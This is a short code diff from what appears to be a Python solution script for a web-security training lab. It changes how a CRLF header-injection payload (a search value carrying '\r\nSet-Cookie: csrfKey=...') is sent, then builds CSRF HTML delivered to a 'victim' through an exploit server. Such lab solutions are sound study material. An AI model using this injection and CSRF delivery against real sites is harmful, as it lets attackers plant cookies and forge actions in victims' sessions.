@@ -18,8 +18,8 @@ def solve_lab(session):
     # search term, allowing me to set arbitrary response headers. I exploit this
     # vulnerability by setting the csrfKey cookie.
 
-    data = {"search": f";\r\nSet-Cookie: csrfKey={csrf_key}"}
-    req = Request("GET", session.url, data=data)
+    params = {"search": f";\r\nSet-Cookie: csrfKey={csrf_key}"}
+    req = Request("GET", session.url, params=params)
     body = generate_csrf_html(req)
     exploit_server.deliver_exploit_to_victim("/exploit", headers, body)
 
